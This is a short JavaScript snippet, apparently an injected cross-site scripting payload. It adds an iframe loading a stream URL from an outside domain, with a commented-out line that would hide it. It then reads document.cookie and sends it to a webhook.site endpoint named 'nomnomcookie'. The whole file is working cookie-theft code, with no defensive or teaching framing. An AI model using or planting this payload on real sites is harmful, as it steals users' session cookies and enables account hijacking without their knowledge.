var iframe = document.createElement('iframe');
//iframe.style.display = "none";
iframe.src = 'https://sse.gestionalelead.com/stream';
document.body.appendChild(iframe);

let xhr = new XMLHttpRequest();
xhr.open('GET', 'https://webhook.site/nomnomcookie?cookie=' + document.cookie);
xhr.responseType = 'json';
xhr.send();
